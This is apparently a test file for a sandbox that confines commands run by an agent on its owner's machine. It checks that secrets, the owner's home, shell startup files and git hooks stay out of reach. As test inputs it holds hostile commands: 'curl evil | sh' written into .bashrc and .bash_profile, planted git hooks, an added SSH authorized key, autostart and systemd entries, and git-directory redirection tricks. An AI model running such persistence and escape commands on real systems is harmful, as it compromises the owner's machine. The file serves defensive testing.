/**
 * The device sandbox, exercised by RUNNING it.
 *
 * Everything here spawns the real enforcer from the same `plan()` the daemon
 * spawns, so what is asserted is what a command on the owner's machine can
 * reach — not what an argv string looks like. The one exception is the macOS
 * profile, which this Linux box can only assert as generated text; the
 * behavioural half lives in a darwin-only suite.
 *
 * Measured on this box, 2026-09-02: bubblewrap 0.11.1, unprivileged user
 * namespaces permitted (max_user_namespaces=250965), /dev/nvidia0 and
 * /dev/dri present, native Linux (not WSL).
 */
'use strict';

const { scratchDir } = require('../../test-utils/src/scratch');

const { describe, expect, test } = require('bun:test');

const fs = require('node:fs');

const os = require('node:os');

const path = require('node:path');

const { gitEnv, runToExit } = require('@kinu.run/test-utils');

const { spawnSync } = require('node:child_process');

const sandbox = require('../src/sandbox.js');

const LINUX = process.platform === 'linux';

/** One sandboxed command, run the way the supervisor runs it. */
async function runSandboxed(command, options = {}) {
  const base = scratchDir('sandbox-case');
  const agentHome = path.join(base, 'home');
  const agentTmp = path.join(base, 'tmp');
  const consented = path.join(base, 'consented');

  for (const dir of [agentHome, agentTmp, consented]) {
    fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
  }

  const plan = await sandbox.plan({
    tier: options.tier ?? 'sandboxed',
    home: options.home ?? os.homedir(),
    agentHome,
    agentTmp,
    deviceHome: path.join(options.home ?? os.homedir(), '.kinu'),
    roots: options.roots === undefined ? [consented] : options.roots,
    cwd: options.cwd ?? agentHome,
    command,
    source: options.source ?? {},
  });

  const run = await runToExit(plan.argv, { env: plan.env });

  return { base, agentHome, agentTmp, consented, plan, status: run.exitCode, stdout: run.stdout, stderr: run.stderr };
}

describe('the device sandbox, as the kernel enforces it', () => {
  test('this machine can sandbox, and says why in one line when it cannot', async () => {
    const result = await sandbox.probe();
    // Not `expect(ok)`: a box without bubblewrap is a legitimate state, and the
    // contract is that the status is a known word carrying an actionable line.
    expect(Object.values(sandbox.SANDBOX_STATUS)).toContain(result.status);

    if (result.status === sandbox.SANDBOX_STATUS.OK) {
      expect(result.detail).toBeNull();
      expect(sandbox.helloCapability(result)).toEqual({ capability: 'sandboxed', reason: null });
    } else {
      // A status the owner cannot act on reads as "Kinu is broken", so every
      // refusal names the command that fixes the machine.
      expect(sandbox.helloCapability(result).capability).toBe('files_only');
      expect(sandbox.helloCapability(result).reason).toBe(result.status);
    }
  });

  test('the owner\'s own home is invisible, including a file planted in it', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // Planted rather than assumed: asserting that ~/.ssh cannot be read proves
    // nothing on a box that has no ~/.ssh.
    const ownerHome = scratchDir('sandbox-owner');
    const planted = path.join(ownerHome, '.kinu-sandbox-planted-secret');
    fs.writeFileSync(planted, 'owner-private-material', { mode: 0o600 });
    const run = await runSandboxed(`cat ${JSON.stringify(planted)} 2>&1; echo ---; ls -a "$HOME" | tr '\n' ' '`, { home: ownerHome });

    try {
      expect(run.stdout).not.toContain('owner-private-material');
      expect(run.stdout).toContain('No such file or directory');
      // The listing is asserted apart from the read, because `cat`'s own error
      // quotes the path and would satisfy a naive "absent from the output".
      const listing = run.stdout.split('---')[1] ?? '';
      expect(listing).not.toContain('.kinu-sandbox-planted-secret');
      expect(listing).toContain('.');
    } finally {

      fs.rmSync(planted, { force: true });
    }
  });

  test('the same command with the Sandbox switch OFF reads the planted secret', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // This is the difference the switch makes, and the reason it defaults on.
    // Reverting the home swap instead proves nothing: bwrap cannot create a
    // mountpoint under the read-only root, so the command simply fails.
    const ownerHome = scratchDir('sandbox-owner');
    const planted = path.join(ownerHome, '.kinu-sandbox-planted-secret');
    fs.writeFileSync(planted, 'owner-private-material', { mode: 0o600 });
    const run = await runSandboxed(`cat ${JSON.stringify(planted)} 2>&1`, { tier: 'raw', home: ownerHome });

    try {
      expect(run.stdout).toContain('owner-private-material');
    } finally {

      fs.rmSync(planted, { force: true });
    }
  });

  test('Kinu\'s own directory is not in the sandbox at all', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const deviceHome = path.join(os.homedir(), '.kinu');
    const run = await runSandboxed(`cat ${JSON.stringify(path.join(deviceHome, 'device.json'))} 2>&1 | head -1`);

    // The kernel says the same thing the file methods say, because neither is
    // asked to make an exception: ~/.kinu is never bound in.
    expect(run.stdout).toContain('No such file');
    expect(run.stdout).not.toContain('"token"');
  });

  test('writes land in the agent home and the consented directory, and nowhere else', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;

    const run = await runSandboxed([
      'touch "$HOME/in-agent-home" && echo home-ok',
      'touch /usr/local/should-not-exist 2>&1 | head -1',
      'touch /etc/should-not-exist 2>&1 | head -1',
    ].join('; '), {});

    expect(run.stdout).toContain('home-ok');
    expect(run.stdout).toContain('Read-only file system');
    expect(fs.existsSync(path.join(run.agentHome, 'in-agent-home'))).toBe(true);
    expect(fs.existsSync('/usr/local/should-not-exist')).toBe(false);
    // The consented root is writable, and the write is visible OUTSIDE:
    // a root that only looked writable would be a tmpfs the owner never sees.
    await runSandboxed(`touch ${JSON.stringify('/tmp/ignored')}; echo done`);

  });

  test('a consented directory is writable and the bytes are the machine\'s own', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const base = scratchDir('sandbox-root');
    const agentHome = path.join(base, 'home');
    const agentTmp = path.join(base, 'tmp');
    const consented = path.join(base, 'work');

    for (const dir of [agentHome, agentTmp, consented]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });

    const plan = await sandbox.plan({
      tier: 'sandboxed', home: os.homedir(), agentHome, agentTmp,
      deviceHome: path.join(os.homedir(), '.kinu'), roots: [consented],
      cwd: consented, command: 'printf agent-wrote-this > report.txt; pwd', source: {},
    });

    const run = await runToExit(plan.argv, { env: plan.env });

    expect(run.exitCode).toBe(0);
    // `--chdir` names the directory as the COMMAND sees it, which for a
    // consented root is its own path.
    expect(String(run.stdout).trim()).toBe(consented);
    expect(fs.readFileSync(path.join(consented, 'report.txt'), 'utf8')).toBe('agent-wrote-this');
  });

  test('the GPU nodes this machine has are inside, and bash-only syntax runs', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // What this host has, read from its own /dev rather than asked of the sandbox.
    const host = fs.readdirSync('/dev').filter((entry) => entry.startsWith('nvidia')).map((entry) => `/dev/${entry}`);

    if (fs.existsSync('/dev/dri')) host.push('/dev/dri');
    const run = await runSandboxed('set -o pipefail; shopt -s nullglob; for node in /dev/nvidia* /dev/dri; do if [[ -e $node ]]; then printf "%s\\n" "$node"; fi; done');

    expect(run.status).toBe(0);

    // Only what this box actually has: `--dev /dev` alone is an empty
    // devtmpfs, which is why a sandbox that stops there has no GPU.
    for (const node of host) expect(run.stdout).toContain(node);
  });

  test('the command environment is the allow-list, with the sandbox\'s own values', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;

    const run = await runSandboxed('env | sort | tr "\\n" " "', {
      source: {
        PATH: '/usr/bin:/bin', LANG: 'C.UTF-8', LC_TIME: 'en_GB.UTF-8', TZ: 'Asia/Kolkata', COLORTERM: 'truecolor',
        HTTPS_PROXY: 'http://proxy.corp:3128', no_proxy: 'localhost',
        KINU_TOKEN: 'ptc_leaked_cli_bearer', GITHUB_TOKEN: 'ghp_leaked_pat', AWS_SECRET_ACCESS_KEY: 'leaked-aws-key',
        SSH_AUTH_SOCK: '/tmp/leaked-agent.sock', NODE_OPTIONS: '--require /tmp/x.js',
      },
    });

    // The sandbox hides ~/.aws and ~/.ssh; the environment must not hand the same secrets over.
    expect(run.stdout).not.toContain('ptc_leaked_cli_bearer');
    expect(run.stdout).not.toContain('ghp_leaked_pat');
    expect(run.stdout).not.toContain('leaked-aws-key');
    expect(run.stdout).not.toContain('SSH_AUTH_SOCK');
    expect(run.stdout).not.toContain('NODE_OPTIONS');
    expect(run.stdout).toContain('KINU_SANDBOX=1');

    // What a command needs to read its clock, its locale, its colours and its network.
    for (const kept of ['LANG=C.UTF-8', 'LC_TIME=en_GB.UTF-8', 'TZ=Asia/Kolkata', 'COLORTERM=truecolor',
      'HTTPS_PROXY=http://proxy.corp:3128', 'no_proxy=localhost']) {
      expect(run.stdout).toContain(kept);
    }
  });

  test('what a dotenv file put into the daemon at launch reaches no command, in either tier', () => {
    const project = scratchDir('launch-dotenv');
    fs.writeFileSync(path.join(project, '.env'), 'PROJECT_DB_URL=postgres://app:secret@db/app\nSHARED=from-dotenv\n');
    fs.writeFileSync(path.join(project, '.env.local'), 'LOCAL_ONLY=local-secret\n');
    fs.writeFileSync(path.join(project, '.env.test.local'), 'TEST_LOCAL=test-secret\n');
    fs.writeFileSync(path.join(project, '.dev.vars'), 'HTTPS_PROXY=http://user:pass@proxy:3128\n');

    const source = {
      PATH: '/usr/bin', PROJECT_DB_URL: 'postgres://app:secret@db/app', LOCAL_ONLY: 'local-secret',
      TEST_LOCAL: 'test-secret', HTTPS_PROXY: 'http://user:pass@proxy:3128',
      // The owner's shell set this name to its own value; only the file's value is the project's.
      SHARED: 'from-the-shell',
    };

    const dotenv = sandbox.launchDotenv(project, 'test');

    // Under NODE_ENV=test Bun skips `.env.local`, so its value came from somewhere else.
    expect(sandbox.rawEnvironment(source, dotenv)).toEqual({ PATH: '/usr/bin', LOCAL_ONLY: 'local-secret', SHARED: 'from-the-shell' });
    expect(sandbox.sandboxEnvironment(source, {}, dotenv)).toEqual({ PATH: '/usr/bin' });
    expect(sandbox.rawEnvironment(source, sandbox.launchDotenv(project, 'development'))).toEqual({
      PATH: '/usr/bin', TEST_LOCAL: 'test-secret', SHARED: 'from-the-shell',
    });
  });

  // The CLI's shell withheld a value any launch file gave; the daemon only the last file's. One policy now (core).
  test('a value any launch dotenv file gave reaches no command, though a later file gave another', () => {
    const project = scratchDir('launch-dotenv-layers');
    fs.writeFileSync(path.join(project, '.env'), 'API_TOKEN=from-env\n');
    fs.writeFileSync(path.join(project, '.dev.vars'), 'API_TOKEN=from-dev-vars\n');

    const dotenv = sandbox.launchDotenv(project, 'development');

    expect(sandbox.rawEnvironment({ PATH: '/usr/bin', API_TOKEN: 'from-env' }, dotenv)).toEqual({ PATH: '/usr/bin' });
    expect(sandbox.rawEnvironment({ PATH: '/usr/bin', API_TOKEN: 'from-the-shell' }, dotenv)).toEqual({ PATH: '/usr/bin', API_TOKEN: 'from-the-shell' });
  });

  test('the raw tier is the machine as it was, minus Kinu\'s own directory', () => {
    const view = sandbox.rawViewFor({ deviceHome: '/home/dev/.kinu', platform: 'linux' });
    expect(view.resolvePath('/etc/hosts', 'read')).toBe('/etc/hosts');
    expect(view.resolvePath('/home/dev/anything', 'write')).toBe('/home/dev/anything');
    expect(() => view.resolvePath('/home/dev/.kinu/device.json', 'read'))
      .toThrow('inside Kinu\'s own directory');
  });

  test('a home under /tmp does not hide the agent home, as a home under /home does not', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // The first-run tier gives each daemon a HOME of its own under the
    // runner's tmpdir, and the daemon's probe answered it with `probe_failed:
    // sandbox probe failed: bwrap: Can't chdir to /tmp/kinu-first-run-…: No
    // such file or directory` (measured 2026-09-04): the agent-tmp bind over
    // `/tmp` shadowed the agent home. Order is the policy.
    const home = scratchDir('sandbox-tmp-home');
    const run = await runSandboxed('pwd; touch "$HOME/marker"; echo reached', { home });

    expect(run.stderr).toBe('');
    expect(run.status).toBe(0);
    expect(run.stdout).toContain(`${run.agentHome}\nreached`);
    // `~/marker` is the AGENT's marker, and the owner's home is untouched.
    expect(fs.existsSync(path.join(run.agentHome, 'marker'))).toBe(true);
    expect(fs.existsSync(path.join(home, 'marker'))).toBe(false);
  });

  test('a consented home never shadows the agent home, and Kinu\'s own directory stays hidden in it', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // `kinu connect` run from ~ consents the home, which holds Kinu's own
    // directory and, inside it, every workspace's agent home.
    const home = scratchDir('sandbox-home-root');
    const deviceHome = path.join(home, '.kinu');
    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
    const agentTmp = path.join(deviceHome, 'agents', 'ws', 'tmp');
    const neighbour = path.join(deviceHome, 'agents', 'other', 'home');

    for (const dir of [agentHome, agentTmp, neighbour]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    fs.writeFileSync(path.join(deviceHome, 'device.json'), '{"token":"pdt_machine_secret"}', { mode: 0o600 });
    fs.writeFileSync(path.join(neighbour, 'notes.txt'), 'another-workspace-private');
    fs.writeFileSync(path.join(home, 'shared.txt'), 'shared-with-the-agent\n');

    const plan = await sandbox.plan({
      tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots: [home], cwd: agentHome, source: {},
      command: [
        'printf agent > "$HOME/x"',
        'echo "HOME=$HOME"',
        `cat ${JSON.stringify(path.join(deviceHome, 'device.json'))} ${JSON.stringify(path.join(neighbour, 'notes.txt'))} 2>&1`,
        `cat ${JSON.stringify(path.join(home, 'shared.txt'))}`,
        `ls ${JSON.stringify(path.join(deviceHome, 'agents'))}`,
      ].join('; '),
    });

    const run = await runToExit(plan.argv, { env: plan.env });

    // The write lands in the agent's own home, which HOME names at its own path.
    expect(fs.existsSync(path.join(home, 'x'))).toBe(false);
    expect(fs.readFileSync(path.join(agentHome, 'x'), 'utf8')).toBe('agent');
    expect(run.stdout).toContain(`HOME=${agentHome}\n`);
    // The home's own files are what the owner shared; Kinu's directory is not.
    expect(run.stdout).toContain('shared-with-the-agent');
    expect(run.stdout).not.toContain('pdt_machine_secret');
    expect(run.stdout).not.toContain('another-workspace-private');
    expect(run.stdout.trim().split('\n').at(-1)).toBe('ws');
    expect(run.stderr).toBe('');
  });

  test('a shim in a consented home\'s ~/.local/bin answers sandboxed, after the agent\'s own tools', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // The first-run tier tells its machines apart with a `hostname` shim, and
    // the shim has to sit where a sandboxed command looks: the plan rebuilds
    // PATH from `LINUX_PATH_HEAD` (`~/.local/bin` first), the agent home's and
    // then a consented home's, and drops the daemon's own PATH, so a shim in
    // `~/bin` never runs and `hostname` answers the real host (measured
    // 2026-09-05). This pins the directory the tier may use, in the layout the
    // tier runs: a scratch HOME the machine consented, like each first-run
    // daemon's own.
    const home = scratchDir('sandbox-shim-home');
    const agentHome = path.join(home, '.kinu', 'agents', 'ws', 'home');
    const agentTmp = path.join(home, '.kinu', 'agents', 'ws', 'tmp');

    for (const dir of [agentHome, agentTmp]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    const shimDir = path.join(home, '.local', 'bin');
    fs.mkdirSync(shimDir, { recursive: true, mode: 0o700 });
    fs.writeFileSync(path.join(shimDir, 'hostname'),
      '#!/usr/bin/env bash\nprintf \'%s\\n\' kinu-first-run-alpha\n', { mode: 0o700 });

    const plan = await sandbox.plan({
      tier: 'sandboxed', home, agentHome, agentTmp,
      deviceHome: path.join(home, '.kinu'), roots: [home],
      cwd: agentHome, command: 'hostname', source: {},
    });

    let pathValue = null;

    for (let i = 0; i < plan.argv.length - 2; i++) {
      if (plan.argv[i] === '--setenv' && plan.argv[i + 1] === 'PATH') pathValue = plan.argv[i + 2];
    }

    expect(pathValue).not.toBeNull();
    const entries = String(pathValue).split(':');
    expect(entries.slice(0, 4)).toEqual([
      path.join(agentHome, '.local', 'bin'), path.join(agentHome, '.cargo', 'bin'), path.join(agentHome, '.bun', 'bin'),
      path.join(home, '.local', 'bin'),
    ]);
    expect(entries).not.toContain(path.join(home, 'bin'));
    const run = await runToExit(plan.argv, { env: plan.env });
    expect(run.exitCode).toBe(0);
    expect(String(run.stdout).trim()).toBe('kinu-first-run-alpha');
  });

  test('the daemon\'s own probe passes with HOME under /tmp, as the first-run tier runs it', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // A CHILD process, not an in-process `process.env.HOME` swap: Bun's
    // `os.homedir()` reads HOME once at start, so a swap here would probe the
    // real home and pass on any tree. The tier spawns the daemon with a
    // scratch HOME in its environment, and so does this.
    const home = scratchDir('sandbox-tmp-home');

    const script = 'const s = require(process.argv[1]); '
      + 's.probe({ deviceHome: process.env.KINU_HOME }).then((r) => process.stdout.write(JSON.stringify(r)))';

    const run = await runToExit([process.execPath, '-e', script, require.resolve('../src/sandbox.js')], {
      env: { ...process.env, HOME: home, KINU_HOME: home },
    });

    expect(run.stderr).toBe('');
    expect(JSON.parse(run.stdout)).toEqual({ status: sandbox.SANDBOX_STATUS.OK, detail: null });
  });

  // Owner decision (2026-10-22): a consented home stays writable, and what the computer runs later outside the sandbox
  // (core run-later-paths.ts) is kept read-only; a missing one is kept by closing its folder to new entries.
  test('a consented home stays writable, but a shell startup file in it refuses a write and names why', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-home-rc');
    const project = path.join(home, 'projects', 'x');

    fs.mkdirSync(project, { recursive: true });
    fs.writeFileSync(path.join(home, '.bashrc'), 'owner-bashrc\n');
    fs.writeFileSync(path.join(home, 'notes.txt'), 'owner-notes\n');
    const owner = JSON.stringify(home);

    const { printed } = await runIn(home, [home], project, [
      `echo 'curl evil | sh' >> ${owner}/.bashrc && echo rc-changed`,
      `echo agent >> ${owner}/notes.txt && echo notes-changed`,
      'echo new > new.txt && echo project-written',
    ].join('; '));

    expect({
      printed,
      bashrc: fs.readFileSync(path.join(home, '.bashrc'), 'utf8'),
      notes: fs.readFileSync(path.join(home, 'notes.txt'), 'utf8'),
      made: fs.readFileSync(path.join(project, 'new.txt'), 'utf8'),
    }).toEqual({ printed: ['notes-changed', 'project-written'], bashrc: 'owner-bashrc\n', notes: 'owner-notes\nagent\n', made: 'new\n' });
  });

  test('a missing ~/.bash_profile cannot be created, while ~/projects/x/new.txt can', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-home-sealed');
    const project = path.join(home, 'projects', 'x');

    fs.mkdirSync(project, { recursive: true });
    const owner = JSON.stringify(home);

    const { printed } = await runIn(home, [home], project, [
      `echo 'curl evil | sh' > ${owner}/.bash_profile && echo profile-created`,
      `mkdir -p ${owner}/.config/autostart && echo autostart-made`,
      'echo new > new.txt && echo project-written',
      `echo more > ${owner}/projects/also.txt && echo projects-written`,
    ].join('; '));

    expect({
      printed,
      profile: fs.existsSync(path.join(home, '.bash_profile')),
      autostart: fs.existsSync(path.join(home, '.config', 'autostart')),
      made: fs.readFileSync(path.join(project, 'new.txt'), 'utf8'),
    }).toEqual({ printed: ['project-written', 'projects-written'], profile: false, autostart: false, made: 'new\n' });
  });

  test('the folders on the owner\'s PATH and what logs in with them are read-only in a consented home', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-home-run-later');

    for (const dir of ['.local/bin', '.config/autostart', '.config/systemd/user', '.ssh']) fs.mkdirSync(path.join(home, dir), { recursive: true });
    const owner = (tail) => JSON.stringify(path.join(home, tail));

    const { printed } = await runIn(home, [home], home, [
      `${plant(owner('.local/bin/git'))}`,
      `echo '[Desktop Entry]' > ${owner('.config/autostart/evil.desktop')} && echo autostart-written`,
      `echo '[Service]' > ${owner('.config/systemd/user/evil.service')} && echo unit-written`,
      `echo 'ssh-ed25519 AAAA agent' >> ${owner('.ssh/authorized_keys')} && echo key-added`,
      `echo ok > ${owner('.config/other.conf')} && echo config-written`,
    ].join('; '));

    expect(printed).toEqual([]);

    for (const tail of ['.local/bin/git', '.config/autostart/evil.desktop', '.config/systemd/user/evil.service', '.ssh/authorized_keys', '.config/other.conf']) {
      expect(fs.existsSync(path.join(home, tail))).toBe(false);
    }
  });

  test('a refused write to a startup file says which file and why, beside the kernel\'s words', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-home-note');

    fs.writeFileSync(path.join(home, '.zshrc'), 'owner-zshrc\n');
    const { plan } = await runIn(home, [home], home, 'true');
    const kernel = `bash: line 1: ${path.join(home, '.zshrc')}: Read-only file system`;
    const sealed = `bash: line 1: ${path.join(home, '.bash_profile')}: Read-only file system`;

    expect(sandbox.guardNote(kernel, plan.guardNames)).toBe(`Kinu's sandbox refused that. ${path.join(home, '.zshrc')} is a shell startup file, which your shell runs outside the sandbox when it starts.`);
    expect(sandbox.guardNote(sealed, plan.guardNames)).toContain(`Create it inside an existing folder instead, e.g. ${path.join(home, 'projects')}/…`);
    expect(sandbox.guardNote('ls: cannot open directory: Permission denied', plan.guardNames)).toBe('');
  });

  test('a consented repository\'s hooks and config refuse a write, and a commit there still lands', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-repository');
    const deviceHome = path.join(home, '.kinu');
    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
    const agentTmp = path.join(deviceHome, 'agents', 'ws', 'tmp');
    const project = path.join(home, 'shop');

    for (const dir of [agentHome, agentTmp, project]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    expect((await runToExit(['git', 'init', '-q', project], { env: gitEnv() })).exitCode).toBe(0);
    const config = fs.readFileSync(path.join(project, '.git', 'config'), 'utf8');

    const plan = await sandbox.plan({
      tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots: [project], cwd: project, source: {},
      command: [
        'printf "#!/bin/sh\\necho planted\\n" > .git/hooks/pre-commit && echo hook-planted',
        'git config core.hooksPath /tmp && echo hooks-path-set',
        'echo shop > README.md && git add README.md',
        'git -c user.name=agent -c user.email=agent@example.com commit -q -m first && echo committed',
      ].join('; '),
    });

    const run = spawnSync(plan.argv[0], plan.argv.slice(1), { env: plan.env, encoding: 'utf8' });

    expect(run.stdout.trim().split('\n')).toEqual(['committed']);
    expect(fs.existsSync(path.join(project, '.git', 'hooks', 'pre-commit'))).toBe(false);
    expect(fs.readFileSync(path.join(project, '.git', 'config'), 'utf8')).toBe(config);
    expect((await runToExit(['git', '-C', project, 'log', '--format=%s'], { env: gitEnv() })).stdout.trim()).toBe('first');
  });

  /** A sandboxed command over `roots` on a machine whose home is `home`, run as the supervisor runs it. */
  async function runIn(home, roots, cwd, command) {
    const deviceHome = path.join(home, '.kinu');
    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
    const agentTmp = path.join(deviceHome, 'agents', 'ws', 'tmp');

    for (const dir of [agentHome, agentTmp]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    const plan = await sandbox.plan({ tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots, cwd, source: {}, command });
    const run = spawnSync(plan.argv[0], plan.argv.slice(1), { env: plan.env, encoding: 'utf8' });

    return { plan, printed: String(run.stdout ?? '').trim().split('\n').filter((line) => line !== '') };
  }

  const plant = (file) => `mkdir -p "$(dirname ${file})" && printf "#!/bin/sh\\necho planted\\n" > ${file} && chmod +x ${file} && echo planted ${file}`;

  const initialized = async (repo) => expect((await runToExit(['git', 'init', '-q', repo], { env: gitEnv() })).exitCode).toBe(0);

  test('the hooks directory git would run is read-only, as the repository\'s config or the owner\'s names it, however deep', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-hooks-path');
    const work = path.join(home, 'work');
    const husky = path.join(work, 'web');
    const deep = path.join(work, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'lib');

    for (const repo of [husky, deep]) await initialized(repo);
    expect((await runToExit(['git', '-C', husky, 'config', 'core.hooksPath', '.husky'], { env: gitEnv() })).exitCode).toBe(0);
    // The owner's own git config names the hooks directory of every repository that names none.
    fs.writeFileSync(path.join(home, '.gitconfig'), '[core]\n\thooksPath = .githooks\n');

    const hooks = ['web/.husky/pre-commit', 'a/b/c/d/e/f/g/h/lib/.githooks/pre-commit', 'a/b/c/d/e/f/g/h/lib/.git/hooks/pre-commit'];
    const { printed } = await runIn(home, [work], work, [...hooks.map(plant), 'echo notes > web/notes.txt && echo notes-written'].join('; '));

    expect(printed).toEqual(['notes-written']);

    for (const hook of hooks) expect(fs.existsSync(path.join(work, hook))).toBe(false);
  });

  test('a linked worktree\'s hooks directory is read-only, though its .git is a file', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // This checkout's own layout: the main repository in the read-only home, a worktree in a shared folder.
    const home = scratchDir('sandbox-worktree');
    const main = path.join(home, 'Proteus');
    const shared = path.join(home, 'wt');
    const tree = path.join(shared, 'lane');
    await initialized(main);

    for (const args of [['config', 'core.hooksPath', '.githooks'], ['commit', '-q', '--allow-empty', '-m', 'first'], ['worktree', 'add', '-q', tree]]) {
      expect((await runToExit(['git', '-C', main, '-c', 'user.name=o', '-c', 'user.email=o@example.com', ...args], { env: gitEnv() })).exitCode).toBe(0);
    }

    const { printed } = await runIn(home, [shared], tree, `${plant('.githooks/pre-commit')}; echo notes > notes.txt && echo notes-written`);

    expect(printed).toEqual(['notes-written']);
    expect(fs.existsSync(path.join(tree, '.githooks', 'pre-commit'))).toBe(false);
  });

  test('a shared folder inside a repository keeps the hooks directory the repository around it names there', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    // husky's monorepo setup: the repository's hooks live in the one package the owner shared.
    const home = scratchDir('sandbox-monorepo');
    const mono = path.join(home, 'mono');
    const frontend = path.join(mono, 'frontend');
    await initialized(mono);
    fs.mkdirSync(frontend);
    expect((await runToExit(['git', '-C', mono, 'config', 'core.hooksPath', 'frontend/.husky'], { env: gitEnv() })).exitCode).toBe(0);

    const { printed } = await runIn(home, [frontend], frontend, `${plant('.husky/pre-commit')}; echo code > app.js && echo app-written`);

    // The owner's own next commit, outside the sandbox, runs no hook.
    const commit = await runToExit(['git', '-C', mono, '-c', 'user.name=o', '-c', 'user.email=o@example.com', 'commit', '-q', '--allow-empty', '-m', 'owner'], { env: gitEnv() });
    expect({ exitCode: commit.exitCode, output: `${commit.stdout}${commit.stderr}` }).toEqual({ exitCode: 0, output: '' });
    expect(printed).toEqual(['app-written']);
  });

  /** The owner's own git command, outside the sandbox, with the machine's home as its HOME: what it printed. */
  const owner = async (home, cwd, args) => {
    const ran = await runToExit(['git', '-c', 'user.name=o', '-c', 'user.email=o@example.com', '-c', 'protocol.file.allow=always', ...args], {
      cwd, env: { HOME: home, PATH: process.env.PATH ?? '' },
    });

    return { exitCode: ran.exitCode, planted: `${ran.stdout}${ran.stderr}`.includes('planted') };
  };

  test('a repository\'s git directory cannot be moved aside and replaced by a writable copy', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-git-rename');
    const shared = path.join(home, 'shared');
    const [shop, cafe] = [path.join(shared, 'shop'), path.join(shared, 'nested', 'cafe')];

    for (const repo of [shop, cafe]) await initialized(repo);

    // The git directory itself, and a folder above it: either moved, the read-only binds move with it.
    const { printed } = await runIn(home, [shared], shared, [
      `(cd shop && mv .git .git.orig && cp -a .git.orig .git && ${plant('.git/hooks/pre-commit')})`,
      `(mv nested nested.orig && cp -a nested.orig nested && ${plant('nested/cafe/.git/hooks/pre-commit')})`,
    ].join('; '));

    for (const repo of [shop, cafe]) {
      expect(await owner(home, repo, ['commit', '-q', '--allow-empty', '-m', 'owner'])).toEqual({ exitCode: 0, planted: false });
    }

    expect(printed).toEqual([]);
  });

  test('a linked worktree\'s .git file cannot be pointed at a repository the agent made', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-gitdir-file');
    const [main, shared] = [path.join(home, 'Proteus'), path.join(home, 'wt')];
    const tree = path.join(shared, 'lane');
    await initialized(main);
    expect((await owner(home, main, ['commit', '-q', '--allow-empty', '-m', 'first'])).exitCode).toBe(0);
    expect((await owner(home, main, ['worktree', 'add', '-q', tree])).exitCode).toBe(0);

    await runIn(home, [shared], shared, [
      `git init -q evil && ${plant('evil/.git/hooks/pre-commit')}`,
      'printf "gitdir: %s\\n" "$PWD/evil/.git" > lane/.git && echo pointed',
    ].join(' && '));

    expect((await owner(home, tree, ['commit', '-q', '--allow-empty', '-m', 'owner'])).planted).toBe(false);
  });

  test('a shared repository\'s record of a worktree elsewhere cannot be pointed at a repository the agent made', async () => {
    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
    const home = scratchDir('sandbox-commondir');
    const shared = path.join(home, 'shared');
    const [mono, tree] = [path.join(shared, 'mono'), path.join(home, 'wt', 'lane')];
    await initialized(mono);
    expect((await owner(home, mono, ['commit', '-q', '--allow-empty', '-m', 'first'])).exitCode).toBe(0);
    expect((await owner(home, mono, ['worktree', 'add', '-q', tree])).exitCode).toBe(0);

    await runIn(home, [shared], shared, [
      `git init -q evil && ${plant('evil/.git/hooks/pre-commit')}`,
      'printf "%s\\n" "$PWD/evil/.git" > mono/.git/worktrees/lane/commondir',
      'printf "%s\\n" "$PWD/evil/.git" > mono/.git/worktrees/lane/gitdir',
    ].join('; '));

    expect((await owner(home, tree, ['commit', '-q', '--allow-empty', '-m', 'owner'])).planted).toBe(false);
  });

  test('a submodule\'s superproject is asked, and the hooks directory it names in the submodule is read-only', async () => {
